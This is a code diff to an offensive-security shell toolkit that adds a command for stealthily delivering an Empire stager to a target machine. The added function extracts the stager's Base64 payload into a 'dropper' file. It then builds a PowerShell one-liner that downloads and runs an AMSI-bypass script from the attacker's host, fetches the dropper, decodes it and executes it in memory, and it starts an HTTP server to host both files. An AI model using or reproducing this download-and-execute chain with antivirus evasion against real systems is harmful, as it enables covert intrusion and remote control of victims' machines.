@@ -14,6 +14,7 @@ Commands
 --------
 nb-srv-install          install dependencies
 nb-srv-file-download    copy command to download a payload into a target machine
+nb-srv-empire-stager    use commands to stealthy download and execute empire stager into a target machine
 nb-srv-web              hosts a python web server in current dir
 nb-srv-ftp              hosts a python ftp server in current dir
 nb-srv-smb              hosts an impacket smb server in current dir
@@ -70,6 +71,39 @@ nb-srv-file-download() {
 
     __info "Run the shell using command:"
     __ok "  Start-Process \"shell-name.exe\""
+}
+
+nb-srv-empire-stager() {
+    __check-project
+    nb-vars-set-lhost
+    nb-vars-set-lport
+
+    # Path to generated Empire stager
+    __ask "Set the directory to Empire payload (without the filename)"
+    local d=$(__askpath DIR $HOME)
+    [[ "$d" == "~"* ]] && __err "~ not allowed, use the full path" && return
+    dp="${d}/dropper"
+    
+    # Encode the stager - grab the Base64 string out of the file and save it in a file called "dropper"
+    cat $dp | grep enc | tr " " "\n" | egrep -e '\S{30}+' > "$HOME/desktop/server/dropper"
+    __info "Stager \"dropper\" encoded."
+
+    # Download the stager and bypass AV
+    __COMMAND="cat << "DOC" 
+
+iex(iwr -UseBasicParsing http://${__LHOST}:${__LPORT}/amsi.ps1)
+$a = iwr -UseBasicParsing http://${__LHOST}:${__LPORT}/dropper
+$b = [System.Convert]::FromBase64String($a)
+iex([System.Text.Encoding]::Unicode.GetString($b))
+
+DOC"
+
+    # Copy the commands to clipboard
+    echo "$__COMMAND" | wl-copy
+    __info "Commands to download the \"dropper\" copied to clipboard."
+
+    # Run the server
+    cd "$HOME/desktop/server" ; echo "$(hip) in $PWD" ; sudo python3 -m http.server 8000
 }
 
 nb-srv-web() {
